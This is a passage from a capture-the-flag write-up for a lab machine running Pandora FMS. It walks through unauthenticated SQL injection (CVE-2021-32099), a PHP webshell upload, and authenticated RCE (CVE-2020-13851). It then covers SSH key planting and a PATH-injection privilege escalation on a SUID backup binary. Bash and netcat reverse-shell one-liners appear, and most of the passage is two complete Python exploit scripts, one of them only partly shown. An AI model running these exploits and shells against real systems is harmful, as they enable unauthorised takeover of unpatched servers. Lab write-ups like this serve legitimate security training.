+Therefore, we get the following if we access to this *URL* from our *browser* → `http://localhost/pandora_console`
+
+![[PANDORA-20250308145647056.webp|450]]
+
+A *Pandora FMS* login panel
+
+As we have valid credentials for the user *Daniel*, let's check if we can access the *Pandora Panel* using them
+
+![[PANDORA-20250308145756356.webp|350]]
+
+And we got the error above
+
+However, at the bottom of this page we can see the version of *Pandora FMS*
+
+```bash
+v7.0NG.742_FIX_PERL2020
+```
+
+> [!INFO]-
+>
+> Since we have access to the system through *SSH*, we also could extract the *Pandora FMS* version from one of its files
+>
+
+Looking for *CVEs* or *vulnerabilities* related to this version of *Pandora FMS*, we found this ***[article](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/)***, which tells us about several flaws that affect the current version of *Pandora FMS* running on the *target*
+
+One of them stands out above the rest → [[CVE-2021-32099]]
+
+This is an ***Unauthenticated SQL Injection***, which allows an attacker, without valid credentials, to access the *Pandora FMS Panel* as an *admin user*
+
+I have created two exploits leveraging the above *security flaw*
+
+- ***[CVE-2021-32099.py](https://github.com/4l3xBB/Exploits/blob/main/CVE-2021-32099/CVE-2021-32099.py)***
+
+It exploits the *unauthenticated SQL Injection* to log into the *Pandora FMS Panel* as an *admin user* by performing a specific *SQL Query* in the injectable *session_id* parameter of the `/include/chart_generator.php` script
+
+After that, it uploads a *malicious extension* contanining a *PHP web shell* which allows an attacker to gain access to the *target* through a *reverse shell*
+
+- ***[CVE-2021-32099_extended.py](https://github.com/4l3xBB/Exploits/blob/main/CVE-2021-32099/CVE-2021-32099_extended.py)***
+
+This is an extended version of the above script, which performs the same actions but also leveraging the *SQL Injection* vulnerability to list all the data in the *current* database
+
+Therefore, we could proceed as follows with the standard version of this exploit to gain access to the *remote machine* as the user running the *Pandora FMS* web page
+
+```bash
+python3 CVE-2021-32099.py "http://localhost/pandora_console" 10.10.16.13 443
+```
+
+![[CVE-2021-32009 1.gif|450]]
+> ***Zoom In***
+
+###### Shell as Web User using Script
+
+Since the *shell* obtained in not on a stable *tty/pty*, let's proceed as follows to send another reverse connection to the another port and upgrade this shell to a *Fully Interactive TTY*
+
+> ***[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)***
+
+- ***Listening Socket from the Attacker and Reverse Shell***
+
+```bash title="Attacker"
+nc -nlvp 443
+```
+
+```bash title="Target"
+bash -c "bash -i &> /dev/tcp/10.10.16.13/1234 0>&2"
+```
+
+- ***Simple Shell to Shell on a Fully Interactive TTY/PTY***
+
+```bash
+script /dev/null -c bash
+<C-z>
+```
+
+```bash
+stty raw -echo ; fg
+reset xterm
+```
+
+```bash
+export TERM=xterm-256color
+export SHELL=/bin/bash
+. /etc/skel/.bashrc
+stty rows 61 columns 248
+```
+
+##### *Unauthenticated SQL Injection + RCE*
+
+> ***Unauthenticated SQL Injection to bypass the Pandora Login Panel leads to Remote Command Execution in the Events Feature***
+
+There is another alternative to gain access to the *remote machine* running *Pandora FMS*
+
+Instead of uploading a malicious extension, we can leverage a *Remote Command Execution* that this version of *Pandora FMS* has in the *Events feature*
+
+Note that in order to exploit this flaw, the attacker must be authenticated
+
+***Authenticated Remote Command Execution → [[CVE-2020-13851]]***
+
+Another exploit has been created to leverage this flaw
+
+As being authenticated is a requirement, we need valid credentials i.e. user and password, or a *session cookie*
+
+Since we have exploited an *Unauthenticated SQL Injection* to bypass the login panel, we can grab the *cookie* from the browser or simply change the *Pandora Admin password*
+
+Once the above is done, proceed as follows
+
+```bash
+python3 CVE-2020-13851.py --cookie "3gd4tvh7lnshk2vfkkta2k06fn" "http://localhost/pandora_console" 10.10.16.13 443
+```
+
+![[CVE-2020-13851.gif|450]]
+> ***Zoom In***
+
+And we gain access to the *target* as *Matt* too 😊
+
+#### Privesc #2
+
+***Non-Privileged User → Matt***
+
+When accessing to a *remote machine* from a *Web Shell*, since It is a *child process* of the *Web Server* processes, in this cases the *Apache workers (Child Processes)*, to avoid any permission restriction applied by any *web server security policy* or something similar, we will connect again to the remote machine as *Matt*, but this time using *SSH*
+
+We do not have any valid credentials for the user *Matt*, but we can add any *SSH public key* that we generate to the `authorized_keys` file of the *Matt's* `.ssh` directory
+
+- ***From the Attacker*** ⚔️
+
+Generate the *SSH keys*
+
+```bash
+ssh-keygen -t rsa -b 4096 -f ./pandora
+```
+
+Copy the content of the *SSH Public key* file named *pandora.pub*
+
+```bash
+/bin/cat pandora.pub
+```
+
+> [!BUG]- *Pandora.pub*
+>
+> ```bash
+> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDrlod6FnEuAgxs6piBxv69HlQEQcSzq9rC4CkyFYCBv/+wdt5n3I6mOCf/j7zfEwEvC/uJ/485baDjp1d9H7OKMX45wzh0Xn6M/gFkbyY84JfuRK4nlcT5zBnVVh+tQHEy4eNpuzPNOxx+nHlW+v+kBbXWOViOWISAnSgOsA5xYM4IQJqxNkXN3oritpjqH7ebC/Px5fpW2IMwmXEojsHPNNVy8Egl8w0ouhPDv6w8MI2PFyafwLJw6jtFiaUDtEQwmH8ItFy7wxO22Ae7+vF+qkB1y6iLGC6Hi3Y4k1IL2GNU4c8NHiXbtNIRBaCr2SVN1MTpoMih2iYfb1oxom50mYUEbNxLB6ak3QbyS3GFJKJpb8yN1FJGxIyMKk9g37W0iGhEYmYP39TzWiTpl6SwxRyD3r3LxT+XZ+bq5/diNuLwjB5qkyCH/FevbfjF/ais5hjbOj3FLISqn9Rxi1plnVce45fJiIb15XKPCZ4K9TmCeZAMZI53jw6XfoJInNiIQZeb9vFGGiOSp5Gqeh7n2oBh0AuDyTp8uqeFUg4SwpPomgfsve8BXJgQd+6Kk2kW0vsZaeBDKJ9xGvDSVquSlSNFem90jVNs0N/fkwHTIWzCyn1RgkvFzHfrieAaJQOv2ogABCd9nG074IxmS4DYX7r3gywarz/gKr+hdJGmqQ== root@parrot
+> ```
+>
+
+Load into memory the *SSH Private Key* that we will use to authenticate to the *remote SSH Server* as follows
+
+```bash
+eval "$( ssh-agent )"
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Agent pid 46027
+> ```
+>
+
+```bash
+ssh-add ./pandora
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Identity added: pandora (root@parrot)
+> ```
+>
+
+Check if the private key has been loaded into memory
+
+```bash
+ssh-add -l
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 4096 SHA256:buDkekIlYdbjkQp/nKZsdoK0isULBoEWU1ysXmeH3NQ root@parrot (RSA)
+> ```
+>
+
+- ***From the Target*** 🎯
+
+Create the *~/.ssh* directory, if it does not exist in *Matt's* home folder, and paste the content of the public key above into it
+
+```bash
+[[ ! -e ~/.ssh ]] && mkdir .ssh && vi ~/.ssh/authorized_keys
+```
+
+
+Then, just log in to the *remote server* from the attacker as *Matt*
+
+```bash
+ssh -p22 matt@10.129.47.86
+```
+
+Once inside, let's check if the *user.txt* flag is in *Matt's home directory*
+
+```bash
+ls ~
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> user.txt
+> ```
+>
+
+And It is! So, extract the flag content and continue!
+
+##### *Path Injection in SUID Binary*
+
+Note that, earlier, we listed the *SUID* binaries on the system as *Daniel*, and found one for which the *user* and *group owner* were *root* and *Matt* respectively
+
+If we do the same again
+
+```bash
+find / -perm -4000 -type f -ls 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
+> 265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
+> 267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
+> 262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
+> 267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
+> 264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
+> 262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
+> 267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
+> 264371     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
+> 264643     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
+> 264040     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
+> 264219     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
+> 267387     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
+> 262815    464 -rwsr-xr-x   1 root     root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
+> 264920     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+> 264927     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+> 266611     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
+> ```
+>
+
+And we have the `/usr/bin/pandora_backup` file
+
+We check what type of file it is
+
+```bash
+file /usr/bin/pandora_backup
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> /usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
+> ```
+>
+
+And it is an *ELF* linux compiled binary
+
+So, before proceed to transfer the binary to our machine, let's check if `strings`, `strace` or `ltrace` are available in the *target*
+
+```bash
+command -V strings &> /dev/null && strings /usr/bin/pandora_backup
+```
+
+No output from `strings`
+
+```bash
+command -V strace &> /dev/null && strace -f -Tt -s 999 -e trace=execve /usr/bin/pandora_backup
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 15:07:19 execve("/usr/bin/pandora_backup", ["/usr/bin/pandora_backup"], 0x7ffef0e57570 /* 31 vars */) = 0 <0.000235>
+> PandoraFMS Backup Utility
+> Now attempting to backup PandoraFMS client
+> strace: Process 2395 attached
+> [pid  2395] 15:07:19 execve("/bin/sh", ["sh", "-c", "tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*"], 0x7ffed584b1c8 /* 31 vars */) = 0 <0.000277>
+> strace: Process 2396 attached
+> [pid  2396] 15:07:19 execve("/usr/bin/tar", ["tar", "-cvf", "/root/.backup/pandora-backup.tar.gz", "/var/www/pandora/pandora_console/AUTHORS", "/var/www/pandora/pandora_console/COPYING", "/var/www/pandora/pandora_console/DB_Dockerfile", "/var/www/pandora/pandora_console/DEBIAN", "/var/www/pandora/pandora_console/Dockerfile", "/var/www/pandora/pandora_console/ajax.php", "/var/www/pandora/pandora_console/attachment", "/var/www/pandora/pandora_console/audit.log", "/var/www/pandora/pandora_console/composer.json", "/var/www/pandora/pandora_console/composer.lock", "/var/www/pandora/pandora_console/docker_entrypoint.sh", "/var/www/pandora/pandora_console/extensions", "/var/www/pandora/pandora_console/extras", "/var/www/pandora/pandora_console/fonts", "/var/www/pandora/pandora_console/general", "/var/www/pandora/pandora_console/godmode", "/var/www/pandora/pandora_console/images", "/var/www/pandora/pandora_console/include", "/var/www/pandora/pandora_console/index.php", "/var/www/pandora/pandora_console/install.done", "/var/www/pandora/pandora_console/mobile", "/var/www/pandora/pandora_console/operation", "/var/www/pandora/pandora_console/pandora_console.log", "/var/www/pandora/pandora_console/pandora_console_logrotate_centos", "/var/www/pandora/pandora_console/pandora_console_logrotate_suse", "/var/www/pandora/pandora_console/pandora_console_logrotate_ubuntu", "/var/www/pandora/pandora_console/pandora_console_upgrade", "/var/www/pandora/pandora_console/pandora_websocket_engine.service", "/var/www/pandora/pandora_console/pandoradb.sql", "/var/www/pandora/pandora_console/pandoradb_data.sql", "/var/www/pandora/pandora_console/tests", "/var/www/pandora/pandora_console/tools", "/var/www/pandora/pandora_console/vendor", "/var/www/pandora/pandora_console/ws.php"], 0x5592d549bc48 /* 31 vars */) = 0 <0.000163>
+> tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+> tar: Error is not recoverable: exiting now
+> [pid  2396] 15:07:19 +++ exited with 2 +++
+> [pid  2395] 15:07:19 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=2396, si_uid=1000, si_status=2, si_utime=0, si_stime=0} ---
+> [pid  2395] 15:07:19 +++ exited with 2 +++
+> 15:07:19 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=2395, si_uid=1000, si_status=2, si_utime=0, si_stime=0} ---
+> Backup failed!
+> Check your permissions!
+> 15:07:19 +++ exited with 1 +++
+> ```
+>
+
+And it seems that this binary makes a backup of all the elements inside `/var/www/pandora/pandora_console` using the `tar` command
+
+We could think of *Wildcard injection* as the `*` character is used in the above command, which expands to all files contained inside the mentioned directory
+
+But, in this case It does not apply as the command is using the *absolute path* of the target folder → `/var/www/pandora/pandora_console`
+
+Therefore, we cannot use the `checkpoint` and `checkpoint-action` `tar` options to exploit this *Wildcard*
+
+However, note that the `tar` command is being used without specifying its *absolute path*, so there is a possible *PATH Injection*
+
+We can leverage this flaw to modify the *PATH* env parameter and add, before the *path* where the `tar` binary is stored, the directory `/dev/shm` and create in it a file called `tar` containing e.g. the following command
+
+```bash
+chmod u+s /bin/bash
+```
+
+ As `/usr/bin/pandora_backup` has the *SUID* permission, it will be run as *root* and, when running `tar`, it will be execute the above command which is inside the `tar` file we have created in the `/dev/shm` directory
+
+Therefore, proceeed as follows →
+
+Create the `tar` file inside `/dev/shm` with the above command
+
+```bash
+cd /dev/shm && printf "chmod u+s /bin/bash" > ./tar
+```
+
+Modify the *PATH env parameter* by adding the current directory first
+
+```bash
+export PATH=.:$PATH
+```
+
+Clear the system *hash* table to avoid any cached *tar* path, such as the real one
+
+```bash
+hash -d
+```
+
+Execute the `/usr/bin/pandora_backup` binary and check if the [[BASH|bash]] binary has the *SUID* permission
+
+```bash
+/usr/bin/pandora_backup && ls -l /bin/bash
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> PandoraFMS Backup Utility
+> Now attempting to backup PandoraFMS client
+> Backup successful!
+> Terminating program!
+> -rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+> ```
+>
+
+And it has! So, just launch a *bash privileged instance*  and grab the *root.txt* flag 😊
+
+```bash
+bash -pi
+```
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+#### Custom Exploits
+
+##### *CVE-2021-32099.py*
+
+> ***[Reference](https://github.com/4l3xBB/Exploits/blob/main/CVE-2021-32099/CVE-2021-32099.py)***
+
+> [!BUG]- *CVE-2021-32099.py*
+>
+> ```python
+> #!/usr/bin/env python3
+> 
+> from colorama import Fore, Style
+> from pwn import *
+> 
+> import requests
+> import sys
+> import os
+> import signal
+> import argparse
+> import threading
+> 
+> def sigIntHandler(sig: signal.Signals, frame: types.FrameType | None) -> None:
+> 
+>     """
+>     Function to handle SIGINT Signals
+> 
+>         - Print Information
+>         - Reset SIGINT Handler
+>         - Send a SIGINT Signal to the current Process instead of sys.exit()(WRONG!!)
+>     """
+> 
+>     print('\n')
+>     p = log.progress(Fore.CYAN + "Interruption" + Style.RESET_ALL)
+>     p.status(Fore.MAGENTA + f"SIGINT Signal sent to {sys.argv[0]}. {Fore.RED}Exiting... ⌛" + Style.RESET_ALL)
+> 
+>     time.sleep(1)
+> 
+>     signal.signal(signal.SIGINT, signal.SIG_DFL)
+> 
+>     os.killpg(os.getpid(), signal.SIGINT)
+> 
+> def banner() -> str:
+> 
+>     return f'''{Fore.GREEN}
+>       ______   ______    ___  ___  ___ ___    ____ ___  ___  ___  ___
+>      / ___/ | / / __/___|_  |/ _ \|_  <  /___|_  /|_  |/ _ \/ _ \/ _ |
+>     / /__ | |/ / _//___/ __// // / __// /___//_ </ __// // /\_, /\_, /
+>     \___/ |___/___/   /____/\___/____/_/   /____/____/\___//___//___/ 
+> {Style.RESET_ALL}'''
+> 
+> def revShellWarning(ip, port) -> str:
+> 
+>     return f'''{Fore.MAGENTA}
+> [!] {Fore.RED}The Reverse Shell obtained is not associated with a stable TTY/PTY ❗
+> 
+> {Fore.MAGENTA}[+] {Fore.BLUE}Try to stablish another reverse connection as follows →
+> 
+>     {Fore.CYAN}[*] {Fore.MAGENTA}bash -c "bash -i &> /dev/tcp/{ip}/{int(port) + 1} 0>&1
+> 
+>     {Fore.CYAN}[*] {Fore.MAGENTA}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {int(port) + 1} >/tmp/f{Style.RESET_ALL}
+>     '''
+> 
+> class Exploit:
+> 
+>     def __init__(self, url, ip, port):
+> 
+>         self.url = url.strip('/')
+>         self.ip = ip
+>         self.port = port
+>         self.session = requests.Session()
+>         self.file = 'shell.zip'
+>         self.payload = f'bash -c "bash -i %26> /dev/tcp/{self.ip}/{self.port} 0>%261"'
+> 
+>     def generateAdminCookie(self):
+> 
+>         """
+>         This method is the main entry point. It performs a SQL Injection by entering the below query
+>         as the value of the session_id parameter, which is not propertly sanitized
+> 
+>         The PHPSESSID Admin Cookie is stored in the HTTP Session for later use
+>         """
+> 
+>         sqli_url = self.url + "/include/chart_generator.php"
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Generating the Admin Cookie ⌛..." + Style.RESET_ALL)
+> 
+>         try:
+>             r = self.session.get(
+>                 sqli_url + f"?session_id='+UNION+SELECT+1,2,'id_usuario|s:5:%22admin%22;'+--+-"
+>             )
+> 
+>             if "Pandora FMS Graph ( - )" in r.text:
+> 
+>                 p.success(Fore.GREEN + "Admin Cookie 🍪 generated successfully ✔" + Style.RESET_ALL) 
+>                 print(
+>                     Fore.MAGENTA + f"\n[+] {Fore.YELLOW}Admin Cookie ➜ " +
+>                     Fore.MAGENTA + r.cookies.get('PHPSESSID') + Style.RESET_ALL
+>                 )
+> 
+>                 return True
+> 
+>             else:
+>                 p.failure(Fore.RED + "The Admin Cookie 🍪 could not be generated ❌" + Style.RESET_ALL)
+> 
+>                 return False
+> 
+>         except requests.RequestException as e:
+> 
+>             print(Fore.RED + f"" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>     def uploadMaliciousExtension(self) -> None:
+> 
+>         """
+>         This method, being authenticated as a Pandora Admin user, uploads a malicious extension which allows an attacker,
+>         later on, to execute arbitrary commands by a PHP web shell
+> 
+>         It sends a POST Request to upload the extension using the previously extracted admin cookie
+>         """
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Pandora Extension 💀" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Uploading the malicious extension ⌛..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         upload_url = self.url + "/index.php?sec=godmode/extensions&sec2=extensions/extension_uploader"
+> 
+>         post_data = {
+>             'upload' : '1',
+>             'submit' : 'Upload'
+>         }
+> 
+>         with open(self.file, "rb") as f:
+> 
+>             files = { 'extension' : (self.file, f.read(), 'application/zip') }
+> 
+>         try:
+>             r = self.session.post(upload_url, files=files, data=post_data)
+> 
+>             if "Extension uploaded successfully" in r.text:
+> 
+>                 p.success(Fore.GREEN + "Extension uploaded successfully ✔" + Style.RESET_ALL)
+> 
+>                 return True
+> 
+>             else:
+>                 p.failure(Fore.RED + "Something went wrong trying to upload the extension ❌" + Style.RESET_ALL)
+> 
+>                 return False
+> 
+>         except requests.RequestException as e:
+> 
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit()
+> 
+>     def setListener(self) -> None:
+> 
+>         """
+>         This Method, executed by a thread, carries out the following actions:
+> 
+>             - Set a Listen Socket in the specified TCP/IP Stack
+>             - Wait a Remote Connection (From the Payload sent)
+>             - Stablish a Connection and receives a Reverse Shell from the Target
+>         """
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Socket ⚙" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + f"Waiting for connection on {self.ip}:{self.port} ⌛..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+> 
+>             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+>             s.bind((self.ip, int(self.port)))
+>             s.listen(1)
+> 
+>             conn, addr = s.accept()
+> 
+>             p.success(Fore.GREEN + f"Connection received from {addr[0]}:{addr[1]} ✔" + Style.RESET_ALL)
+> 
+>             print(revShellWarning(self.ip, self.port))
+> 
+>             print(Fore.RED + f'[+] {Fore.YELLOW}Press [Enter] to get the Reverse Shell' + Style.RESET_ALL)
+>             print(Fore.RED + f'\n[+] {Fore.YELLOW}Press C-c or type "exit" to quit the Shell\n' + Style.RESET_ALL)
+> 
+>             print(conn.recv(4096).decode(), end='')
+> 
+>             while True:
+> 
+>                 cmd = input()
+> 
+>                 if cmd == "exit":
+> 
+>                     break
+> 
+>                 conn.send((cmd + '\n').encode())
+>                 time.sleep(1)
+> 
+>                 print(conn.recv(4096).decode(), end='')
+> 
+>     def getReverseShell(self) -> None:
+> 
+>         """
+>         This method performs an HTTP GET Request to the loaded extension to send a reverse shell
+>         to the listening socket through a PHP web shell
+>         """
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Rev Shell 🐉" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Getting the reverse shell ⌛..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         extension_url = self.url + "/extensions/shell.php"
+> 
+>         try:
+>             r = self.session.get(extension_url + f'?cmd={self.payload}')
+> 
+>             if r.status_code == 200:
+> 
+>                 p.success(Fore.GREEN + "Reverse Shell send correctly ✔" + Style.RESET_ALL)
+> 
+>                 return True
+> 
+>             else:
+>                 p.failure(Fore.RED + "Could not send the reverse shell ❌" + Style.RESET_ALL)
+> 
+>                 return False
+> 
+>         except requests.RequestException as e:
+> 
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>     def runExploit(self) -> None:
+> 
+>         """
+>         Method which executes the other instance methods
+>         """
+> 
+>         self.uploadMaliciousExtension() if self.generateAdminCookie() else exit(1)
+> 
+>         lthread = threading.Thread(target=self.setListener)
+>         lthread.start()
+>         time.sleep(1)
+> 
+>         self.getReverseShell()
+> 
+>         lthread.join()
+> 
+> def main() -> None:
+> 
+>     print(banner())
+> 
+>     signal.signal(signal.SIGINT, sigIntHandler)
+> 
+>     parser = argparse.ArgumentParser(
+> 
+>         description=Fore.MAGENTA + "CVE-2021-32099 PoC" + Style.RESET_ALL
+>     )
+> 
+>     parser.add_argument('url', help='Pandora Console URL e.g. http://localhost:8080/pandora_console')
+>     parser.add_argument('ip', help='Attacker IP Address')
+>     parser.add_argument('lport', help='Attacker Listening Port')
+> 
+>     opts = parser.parse_args()
+> 
+>     if any(not opt for opt in (opts.url, opts.ip, opts.lport)):
+> 
+>         parser.print_help()
+>         sys.exit(1)
+> 
+>     exploit = Exploit(opts.url, opts.ip, opts.lport)
+> 
+>     exploit.runExploit()
+> 
+> if __name__ == '__main__':
+> 
+>     main()
+> ```
+>
+
+![[CVE-2021-32009 1.gif|450]]
+
+##### *CVE-2021-32099_extended.py*
+
+> ***[Reference](https://github.com/4l3xBB/Exploits/blob/main/CVE-2021-32099/CVE-2021-32099_extended.py)***
+
+> [!BUG]- *CVE-2021-32099_extended.py*
+>
+> ```python
+> #!/usr/bin/env python3
+> 
+> from pwn import *
+> from colorama import Fore, Style
+> import requests
+> import threading
+> import socket
+> import string
+> import os
+> import sys
+> import argparse
+> import signal
+> import time
+> 
+> def sigintHandler(sig, term) -> None:
+> 
+>     """
+>     Function to handle SIGINT Signals
+> 
+>         - Print Information
+>         - Reset SIGINT Handler
+>         - Send a SIGINT Signal to the current Process instead of sys.exit()(WRONG!!)
+>     """
+> 
+>     print("\n")
+>     p = log.progress(Fore.CYAN + 'Exit' + Style.RESET_ALL)
+>     p.status(Fore.MAGENTA + "SIGINT signal sent to the current process. Exiting... ⏳" + Style.RESET_ALL)
+> 
+>     time.sleep(1)
+> 
+>     signal.signal(signal.SIGINT, signal.SIG_DFL)
+> 
+>     os.killpg(os.getpid(), signal.SIGINT)
+> 
+> def banner() -> str:
+> 
+>     return f'''{Fore.GREEN}
+>       ______   ______    ___  ___  ___ ___    ____ ___  ___  ___  ___
+>      / ___/ | / / __/___|_  |/ _ \|_  <  /___|_  /|_  |/ _ \/ _ \/ _ |
+>     / /__ | |/ / _//___/ __// // / __// /___//_ </ __// // /\_, /\_, /
+>     \___/ |___/___/   /____/\___/____/_/   /____/____/\___//___//___/ 
+> {Style.RESET_ALL}'''
+> 
+> def revShellWarning(ip: str, port: int) -> None:
+> 
+>     return f'''{Fore.MAGENTA}
+> [!] {Fore.RED}The Reverse Shell obtained is not associated with a stable TTY/PTY ❗
+> 
+> {Fore.MAGENTA}[ℹ] {Fore.BLUE}Try to stablish another reverse connection as follows →
+> 
+>     {Fore.CYAN}[*] {Fore.MAGENTA}bash -c "bash -i &> /dev/tcp/{ip}/{int(port) + 1} 0>&1
+> 
+>     {Fore.CYAN}[*] {Fore.MAGENTA}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {int(port) + 1} >/tmp/f{Style.RESET_ALL}
+>         '''
+> 
+> class SQLInjection():
+> 
+>     def __init__(self, url: str) -> str:
+> 
+>         self.url = url.strip('/') + '/include/chart_generator.php'
+>         self.chars = string.ascii_letters + string.digits + '-_'
+>         self.session = requests.Session()
+>         self.db_length = ''
+>         self.database = ''
+>         self.table = ''
+>         self.columns_length = ''
+>         self.adminCookie_length = ''
+>         self.admin_cookie = ''
+> 
+>         self.ACCESS_DENIED_MSG = "Access denied"
+> 
+>     def makeSQLQuery(self, query: str) -> requests.Response:
+> 
+>         """
+>         This method sends an HTTP GET Requests with the URL Parameters passed as arguments
+>         related to the SQLi Injection
+>         """
+> 
+>         try:
+>             return self.session.get(self.url + query)
+> 
+>         except requests.RequestException as e:
+> 
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>     def getDBLength(self) -> int:
+> 
+>         """
+>         This method extracts the current DB Name Length used by the Web Application and returns
+>         the specific number for other methods of the same instance
+>         """
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+> 
+>         p1.status(Fore.MAGENTA + "Extracting Current DB Name Length... ⏳" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.GREEN + "Length" + Style.RESET_ALL)
+> 
+>         for number in range(1,20):
+> 
+>             r = self.makeSQLQuery(f"?session_id='+or+IF(LENGTH(database())={number},1,0)--+-")
+> 
+>             p2.status(Fore.CYAN + str(number) + Style.RESET_ALL)
+> 
+>             if self.ACCESS_DENIED_MSG not in r.text:
+> 
+>                 p2.success(Fore.RED + str(number) + Style.RESET_ALL)
+>                 p1.success(Fore.GREEN + "Current DB Length extracted ✔" + Style.RESET_ALL)
+> 
+>                 return number
+> 
+>     def getDBName(self) -> None:
+> 
+>         """
+>         This method lists the current Database Name used by the Web Application
+>         according to its length
+>         """
+> 
+>         self.db_length = self.getDBLength()
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+> 
+>         p1.status(Fore.MAGENTA + "Enumerating DB Name... ⏳" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.GREEN + "Database" + Style.RESET_ALL)
+> 
+>         for position in range(1, self.db_length + 1):
+> 
+>             for char in self.chars:
+> 
+>                 r = self.makeSQLQuery(f"?session_id='+or+IF(SUBSTR((select+database()),{position},1)='{char}',1,0)+--+-")
+> 
+>                 p2.status(Fore.RED + self.database + char + Style.RESET_ALL)
+> 
+>                 if self.ACCESS_DENIED_MSG not in r.text:
+> 
+>                     self.database += char
+>                     break
+> 
+>         p2.success(Fore.RED + self.database + Style.RESET_ALL)
+>         p1.success(Fore.GREEN + "Current DB Name extracted ✔" + Style.RESET_ALL)
+> 
+>     def getDBTables(self) -> None:
+> 
+>         """
+>         This method carries out an enumeration of the current database's tables
+>         The user can exit the extraction pressing C-c
+>         It will ask for the name of the database table to list its columns
+>         """
+> 
+>         self.getDBName()
+> 
+>         signal.signal(signal.SIGINT, signal.default_int_handler)
+> 
+>         tables = ''
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + f"Extracting {self.database} DB Tables Names... ⏳" + Style.RESET_ALL)
+>         time.sleep(2)
+> 
+>         p.status(Fore.MAGENTA + f"{Fore.YELLOW}Press C-c to leave the DB Table Extraction Mode" + Style.RESET_ALL)
+> 
+>         print(
+>             Fore.MAGENTA + f"\n[+] {Fore.CYAN}{self.database} DB Tables:", Fore.GREEN + "\n\n\t[*] " + Style.RESET_ALL, end=''
+>         )
+> 
+>         try:
+>             for position in range(1,2800):
+> 
+>                 for char in self.chars + ',':
+> 
+>                     r = self.session.get(
+>                         self.url + f"?session_id='+or+IF(SUBSTR((SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema='{self.database}'),{position},1)='{char}',0,1)+--+-"
+>                     )
+> 
+>                     if self.ACCESS_DENIED_MSG in r.text:
+> 
